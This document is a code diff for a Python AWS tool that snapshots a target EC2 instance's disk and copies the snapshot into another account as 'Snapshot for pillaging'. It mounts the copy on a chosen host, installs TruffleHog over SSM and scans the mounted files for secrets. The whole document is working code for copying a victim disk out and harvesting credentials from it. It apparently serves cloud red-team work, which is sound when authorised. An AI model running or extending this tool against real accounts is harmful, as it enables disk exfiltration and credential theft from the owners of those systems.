@@ -115,7 +115,7 @@ def create_snapshot(ec2_client, instance_id, profile_name, region_name):
         return None
 
 def transfer_snapshot(src_profile, dst_profile, src_region, dst_region, snapshot_id):
-    """Transfer EBS snapshot from source account to destination account."""
+    """Transfer EBS snapshot from source account to destination account and create a volume in the destination account."""
     def json_serialize(obj):
         """JSON serializer for objects not serializable by default json code"""
         if isinstance(obj, datetime):
@@ -139,36 +139,76 @@ def transfer_snapshot(src_profile, dst_profile, src_region, dst_region, snapshot
         response = ec2_src.describe_snapshots(SnapshotIds=[snapshot_id])
         source_snapshot = response['Snapshots'][0]
 
-        # Log the source_snapshot details with custom JSON serialization for datetime objects
         logging.info(f"Source snapshot details: {json.dumps(source_snapshot, default=json_serialize, indent=4)}")
 
-        # Extract the region from the source snapshot
-        source_region = src_region  # Use the provided src_region directly
-
-        # Log the command being run
-        logging.info(f"Running command: ec2_dst.copy_snapshot("
-                     f"SourceSnapshotId={snapshot_id}, "
-                     f"SourceRegion={source_region}, "
-                     f"DestinationRegion={dst_region}, "
-                     f"DestinationAccountId={dst_account_id})")
-
+        # Copy the snapshot to the destination account
         copied_snapshot = ec2_dst.copy_snapshot(
             SourceSnapshotId=snapshot_id,
-            SourceRegion=source_region,
-            DestinationRegion=dst_region,
+            SourceRegion=src_region,
+            Description='Snapshot for pillaging',
             TagSpecifications=[{
                 'ResourceType': 'snapshot',
                 'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
             }]
         )
 
-        logging.info(f"Snapshot {copied_snapshot['SnapshotId']} transferred from {src_profile} to {dst_profile}.")
-        return copied_snapshot['SnapshotId']  # Return the new snapshot ID
+        copied_snapshot_id = copied_snapshot['SnapshotId']
+        logging.info(f"Snapshot {copied_snapshot_id} transferred from {src_profile} to {dst_profile}.")
+
+        # Wait for the copied snapshot to become available, with retries
+        retries = 5
+        for attempt in range(retries):
+            try:
+                ec2_dst.get_waiter('snapshot_completed').wait(SnapshotIds=[copied_snapshot_id])
+                logging.info(f"Snapshot {copied_snapshot_id} is now available.")
+                break
+            except Exception as e:
+                logging.error(f"Snapshot copy attempt {attempt + 1} failed: {str(e)}")
+                if attempt < retries - 1:
+                    logging.info("Retrying snapshot copy...")
+                    time.sleep(30)  # Wait before retrying
+                else:
+                    logging.error(f"Snapshot transfer failed after {retries} attempts.")
+                    return None
+
+        # Create the volume in the destination account from the copied snapshot
+        dst_volume_id = create_volume_in_destination_account(ec2_dst, copied_snapshot_id, dst_profile, dst_region)
+        return dst_volume_id  # Return the new volume ID in the destination account
 
     except Exception as e:
         logging.error(f"Snapshot transfer failed: {str(e)}")
         return None
 
+def create_volume_in_destination_account(ec2_client, snapshot_id, profile_name, region_name):
+    """Create a volume from the copied snapshot in the destination account."""
+    logging.info(f"Creating volume from snapshot {snapshot_id} in the destination account {profile_name}...")
+    try:
+        # Create the volume using the correct availability zone in the destination account
+        availability_zone = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]['AvailabilityZone']
+
+        volume = ec2_client.create_volume(
+            SnapshotId=snapshot_id,
+            AvailabilityZone=availability_zone,
+            TagSpecifications=[{
+                'ResourceType': 'volume',
+                'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
+            }]
+        )
+        dst_volume_id = volume['VolumeId']
+
+        # Wait for the volume to become available
+        logging.info(f"Waiting for volume {dst_volume_id} to become available in the destination account...")
+        ec2_client.get_waiter('volume_available').wait(VolumeIds=[dst_volume_id])
+
+        # Add a delay to ensure the volume is fully registered
+        time.sleep(10)
+
+        logging.info(f"Volume {dst_volume_id} created successfully in the destination account.")
+        return dst_volume_id
+
+    except Exception as e:
+        logging.error(f"Failed to create volume in destination account: {str(e)}")
+        return None
 
 def find_available_device(ec2_client, instance_id):
     """Find an available device name on the EC2 instance."""
@@ -215,20 +255,20 @@ def create_volume(ec2_client, snapshot_id, instance_id, is_src_profile=True):
                 'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
             }]
         )
-        dst_volume_id = volume['VolumeId']  # Updated to capture the correct volume ID
+        dst_volume_id = volume['VolumeId']
 
         # Wait for the volume to become available
-        attempts = 0
-        while True:
-            volume_status = ec2_client.describe_volumes(VolumeIds=[dst_volume_id])['Volumes'][0]['State']
-            if volume_status == 'available':
-                logging.info(f"Volume {dst_volume_id} is now available.")
-                break
-            elif attempts >= 30:
-                raise TimeoutError("Max attempts exceeded while waiting for volume to be available.")
-            else:
-                attempts += 1
-                time.sleep(10)  # Wait for 10 seconds before checking again
+        logging.info(f"Waiting for volume {dst_volume_id} to become available...")
+        ec2_client.get_waiter('volume_available').wait(VolumeIds=[dst_volume_id])
+
+        # Add a longer delay to ensure the volume is fully registered and recognized across AWS
+        logging.info("Waiting additional time for the volume to be fully registered...")
+        time.sleep(30)  # Increase delay to 30 seconds or more if needed
+
+        # Validate the volume exists in the destination account before attempting to attach
+        volumes = ec2_client.describe_volumes(VolumeIds=[dst_volume_id])['Volumes']
+        if not volumes:
+            raise ValueError(f"Volume {dst_volume_id} does not exist or is not available.")
 
         logging.info(f"Volume {dst_volume_id} created successfully from snapshot {snapshot_id}.")
         return dst_volume_id
@@ -236,7 +276,6 @@ def create_volume(ec2_client, snapshot_id, instance_id, is_src_profile=True):
     except Exception as e:
         logging.error(f"Failed to create volume from snapshot: {str(e)}")
         return None
-
 
 def delete_snapshot_and_volume(ec2_client, src_snapshot_id, dst_snapshot_id, dst_volume_id, retain=False):
     """Delete the specified snapshots and EBS volume."""
@@ -308,90 +347,103 @@ def find_attached_volumes(instance_id, ssm_client):
 def mount_ebs_volume(instance_id, volume_id, ssh_key_path, mount_path, profile_name, region):
     """Mount the Linux partition of an EBS volume to a specified instance with SSM."""
     try:
-
-        # Create an AWS session using the specified profile and region
         session = boto3.Session(profile_name=profile_name, region_name=region)
-
-        # Create the SSM client using the session
+        ec2_client = session.client('ec2')
         ssm_client = session.client('ssm')
 
-        # Create the mount path using SSM
-        create_mount_path_command = f"sudo mkdir -p {mount_path}"
-        # print(f"Creating mount path command: {create_mount_path_command}")
-        response = ssm_client.send_command(
-            InstanceIds=[instance_id],
-            DocumentName="AWS-RunShellScript",
-            Parameters={'commands': [create_mount_path_command]}
-        )
-
-        # Wait for the command to complete
-        command_id = response['Command']['CommandId']
-        # print(f"Waiting for command with ID {command_id} to complete...")
-
-        # Add debug print statements here
-        # print(f"Command ID: {command_id}")
-        # print(f"Instance ID: {instance_id}")
-        # print(f"Plugin Name: 'aws:runShellScript'")
-
-        # print(f"Command with ID {command_id} completed.")
-
-        # Find attached volumes using SSM
-        # print(f"we are hereeeeeeee")
-        attached_volumes = find_attached_volumes(instance_id, ssm_client)
-
-        # Filter attached volumes to get only NVMe devices
-        nvme_volumes = [volume for volume in attached_volumes if volume.startswith('nvme')]
-        # print(f"NVMe volumes found: {nvme_volumes}")
-
-        # Sort the NVMe volumes based on the numeric part of the device name
-        nvme_volumes_sorted = sorted(nvme_volumes, key=lambda x: int(re.search(r'\d+', x).group()))
-        # print(f"Sorted NVMe volumes: {nvme_volumes_sorted}")
-
-        # Choose the first partition of the last attached NVMe volume for mounting
-        if nvme_volumes_sorted:
-            latest_device_name = nvme_volumes_sorted[-1]
-
-            # Extract the drive number from the device name
-            drive_number = re.search(r'nvme(\d+)', latest_device_name).group(1)
-
-            # Recreate the device name with the first partition
-            recreated_device_name = f"nvme{drive_number}n1p1"
-
-            # print(f"Latest NVMe device name: {latest_device_name}")
-            # print(f"Recreated device name for mounting: {recreated_device_name}")
-        else:
-            logging.error("No attached NVMe volumes found.")
+        # Attach the volume to the instance
+        device_name = find_available_device(ec2_client, instance_id)
+        if not device_name:
+            logging.error(f"No available device name found for attachment on instance {instance_id}.")
             return None
 
-        # Run the mount command using SSM for the first partition
-        mount_command = f"sudo mount /dev/{recreated_device_name} {mount_path}"
-        # print(f"Mounting command: {mount_command}")
+        ec2_client.attach_volume(
+            VolumeId=volume_id,
+            InstanceId=instance_id,
+            Device=device_name
+        )
+
+        logging.info(f"Volume {volume_id} attached to {instance_id} as {device_name}.")
+
+        # Wait for the volume to be attached
+        time.sleep(10)  # Give some time for the attachment to take place
+
+        # Check attached volumes
+        attached_volumes = find_attached_volumes(instance_id, ssm_client)
+        logging.info(f"Attached volumes: {attached_volumes}")
+
+        # Run the mount command using SSM
+        mount_command = f"sudo mount {device_name}1 {mount_path}"  # Assuming first partition
         response = ssm_client.send_command(
             InstanceIds=[instance_id],
             DocumentName="AWS-RunShellScript",
             Parameters={'commands': [mount_command]}
         )
 
-        # Wait for the command to complete
         command_id = response['Command']['CommandId']
-        # print(f"Waiting for mount command with ID {command_id} to complete...")
 
-        logging.info(f"Volume {volume_id} mounted to {mount_path} on /dev/{recreated_device_name}")
+        # Verify mount success
+        verify_mount_command = f"ls {mount_path}"
+        verify_response = ssm_client.send_command(
+            InstanceIds=[instance_id],
+            DocumentName="AWS-RunShellScript",
+            Parameters={'commands': [verify_mount_command]}
+        )
+
+        verify_command_output = ssm_client.get_command_invocation(
+            CommandId=verify_response['Command']['CommandId'],
+            InstanceId=instance_id,
+            PluginName='aws:runShellScript'
+        )
+
+        if 'StandardOutputContent' in verify_command_output and verify_command_output['StandardOutputContent']:
+            logging.info(f"Contents of {mount_path} after mounting: {verify_command_output['StandardOutputContent']}")
+        else:
+            logging.error(f"Failed to verify the mount or directory is empty: {mount_path}")
+            return None
+
+        logging.info(f"Volume {volume_id} mounted to {mount_path} on {device_name}.")
         return mount_path
 
     except Exception as e:
         logging.error(f"Failed to attach and mount volume {volume_id} to {instance_id}: {str(e)}")
         return None
 
+
 def install_trufflehog_ssm(instance_id, ssm_client):
     try:
-        # SSM command to install Trufflehog
+        # First, check if Trufflehog is already installed
+        check_command = "if command -v /tmp/trufflehog > /dev/null; then echo 'exists'; else echo 'missing'; fi"
+        response = ssm_client.send_command(
+            InstanceIds=[instance_id],
+            DocumentName="AWS-RunShellScript",
+            Parameters={'commands': [check_command]}
+        )
+        command_id = response['Command']['CommandId']
+
+        # Wait for the check command to complete
+        while True:
+            time.sleep(5)  # Adjust the sleep duration as needed
+            command_output = ssm_client.get_command_invocation(
+                CommandId=command_id,
+                InstanceId=instance_id,
+                PluginName='aws:runShellScript'
+            )
+            if command_output['Status'] in ['Success', 'Failed']:
+                break
+
+        # Determine if installation is needed
+        if 'StandardOutputContent' in command_output and 'exists' in command_output['StandardOutputContent']:
+            logging.info("Trufflehog is already installed on the instance.")
+            return command_id  # Trufflehog already installed, return success
+
+        # Proceed with installation if missing
         install_command = """
             sudo apt update && sudo apt install -y wget && \
             wget https://github.com/trufflesecurity/trufflehog/releases/download/v3.75.0/trufflehog_3.75.0_linux_amd64.tar.gz -O /tmp/trufflehog.tar.gz && \
             tar xzf /tmp/trufflehog.tar.gz -C /tmp/ && \
             chmod +x /tmp/trufflehog && \
-            ls -lah /tmp/trufflehog
+            if command -v /tmp/trufflehog > /dev/null; then echo 'installation success'; else echo 'installation failed'; fi
         """
 
         # Send the install command to the instance
@@ -401,15 +453,27 @@ def install_trufflehog_ssm(instance_id, ssm_client):
             Parameters={'commands': [install_command]}
         )
 
-        # Get the command execution ID to track installation progress if needed
         command_id = response['Command']['CommandId']
-        # logging.info(f"Trufflehog installation command ID: {command_id}")
+        logging.info(f"Trufflehog installation command ID: {command_id}")
 
-        # Stream the command output if necessary
-        # stream_command_output(ssm_client, command_id, instance_id)
-        # You may want to stream the output to monitor the installation progress
+        # Wait for the installation to complete and verify
+        while True:
+            time.sleep(10)  # Adjust the sleep duration as needed
+            command_output = ssm_client.get_command_invocation(
+                CommandId=command_id,
+                InstanceId=instance_id,
+                PluginName='aws:runShellScript'
+            )
+            if command_output['Status'] in ['Success', 'Failed']:
+                break
 
-        return command_id
+        # Check if the installation was successful
+        if 'StandardOutputContent' in command_output and 'installation success' in command_output['StandardOutputContent']:
+            logging.info("Trufflehog installed successfully.")
+            return command_id
+        else:
+            logging.error("Trufflehog installation failed.")
+            return None
 
     except Exception as e:
         logging.error(f"Trufflehog installation over SSM failed: {str(e)}")
@@ -423,9 +487,12 @@ def run_trufflehog_ssm(instance_id, mount_point, pillage_path, ssh_key_path, ssm
             logging.error("Failed to initiate Trufflehog installation.")
             return None
 
+        # Combine the mount path and pillage path
+        full_pillage_path = os.path.join(mount_point, pillage_path.lstrip('/'))
+
         # SSM command to run Trufflehog and redirect output to a file
         output_file = '/tmp/trufflehog.out'
-        ssm_command = f"/tmp/trufflehog filesystem {'--json' if json_output else ''} --no-verification --concurrency=5 {os.path.join(mount_point, pillage_path.lstrip('/'))} > {output_file}"
+        ssm_command = f"/tmp/trufflehog filesystem {'--json' if json_output else ''} --no-verification --concurrency=5 {full_pillage_path} > {output_file}"
 
         # Send the run command to the instance
         response = ssm_client.send_command(
@@ -567,6 +634,10 @@ def main(src_profile, dst_profile, src_region, dst_region, list_ebs, list_ec2, m
     ec2_resource_dst = session_dst.resource('ec2')
     ssm_client_dst = session_dst.client('ssm')
 
+    # Get account IDs for source and destination
+    src_account_id = session_src.client('sts').get_caller_identity()['Account']
+    dst_account_id = session_dst.client('sts').get_caller_identity()['Account']
+
     if list_ebs:
         logging.debug("Listing EBS volumes in the destination account:")
         volumes, snapshots = list_ebs_volumes(ec2_resource_dst)
@@ -583,39 +654,29 @@ def main(src_profile, dst_profile, src_region, dst_region, list_ebs, list_ec2, m
             logging.info(f'Instance ID: {instance["InstanceId"]}, State: {instance["State"]}, Public IP: {instance["PublicIpAddress"]}, Private IP: {instance["PrivateIpAddress"]}')
         return  # Exit after listing EC2 instances
 
-    if transfer:
-        logging.debug(f"Verifying target EC2 instance {target_ec2} in the source account {src_profile}:")
-        # Validate that target_ec2 is in the source account
-        try:
-            instance = ec2_client_src.describe_instances(InstanceIds=[target_ec2])
-            reservations = instance.get('Reservations', [])
-            if not reservations:
-                raise ValueError(f"No reservations found for instance {target_ec2} in source account {src_profile}")
-            
-            logging.info(f"Target EC2 instance {target_ec2} verified in source account {src_profile}.")
-        except Exception as e:
-            logging.error(f"Failed to verify target EC2 instance in source account: {str(e)}")
-            return
-
     if pillage and mount_host and target_ec2:
         logging.debug(f"Creating snapshot for target EC2 instance {target_ec2} in the source account {src_profile}:")
         snapshot_id = create_snapshot(ec2_client_src, target_ec2, src_profile, src_region)
         if snapshot_id:
-            if src_profile != dst_profile and transfer:
+            if src_account_id != dst_account_id and transfer:
                 logging.debug(f"Transferring snapshot {snapshot_id} from {src_profile} to {dst_profile}")
-                transfer_snapshot(src_profile, dst_profile, src_region, dst_region, snapshot_id)
-                # Now use the destination profile to create the volume
-                logging.debug(f"Creating volume from snapshot {snapshot_id} in the source account {src_profile}")
+                transferred_volume_id = transfer_snapshot(src_profile, dst_profile, src_region, dst_region, snapshot_id)
+                if not transferred_volume_id:
+                    logging.error("Snapshot transfer failed, aborting operation.")
+                    return
+                dst_volume_id = transferred_volume_id
+            elif src_account_id == dst_account_id:
+                logging.debug(f"Creating volume from snapshot {snapshot_id} in the same account.")
                 dst_volume_id = create_volume(ec2_client_src, snapshot_id, target_ec2, is_src_profile=True)
             else:
-                logging.debug(f"Creating volume from snapshot {snapshot_id} in the source account {src_profile}")
-                dst_volume_id = create_volume(ec2_client_src, snapshot_id, target_ec2, is_src_profile=True)
+                logging.error("Source and destination accounts are different. You must pass the --transfer argument for cross-account operations.")
+                return
 
             if dst_volume_id:
-                logging.info(f'Volume {dst_volume_id} created in the source account and attached to instance {target_ec2}.')
+                logging.info(f'Volume {dst_volume_id} created in the {"source" if src_account_id == dst_account_id else "destination"} account and attached to instance {mount_host}.')
 
-                logging.debug(f"Mounting EBS volume {dst_volume_id} on instance {mount_host} in the {'source' if src_profile == dst_profile else 'destination'} account")
-                mount_point = mount_ebs_volume(mount_host, dst_volume_id, ssh_key_path, mount_path, dst_profile if src_profile != dst_profile else src_profile, dst_region if src_profile != dst_profile else src_region)
+                logging.debug(f"Mounting EBS volume {dst_volume_id} on instance {mount_host} in the {'source' if src_account_id == dst_account_id else 'destination'} account")
+                mount_point = mount_ebs_volume(mount_host, dst_volume_id, ssh_key_path, mount_path, dst_profile if src_account_id != dst_account_id else src_profile, dst_region if src_account_id != dst_account_id else src_region)
                 if mount_point:
                     logging.info(f'Volume {dst_volume_id} mounted to {mount_point}')
 
@@ -640,6 +701,7 @@ def main(src_profile, dst_profile, src_region, dst_region, list_ebs, list_ec2, m
             logging.error("Failed to create snapshot.")
     else:
         logging.error("Not all necessary parameters provided for pillaging.")
+
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Process EBS volumes and enumerate EC2 instances.')
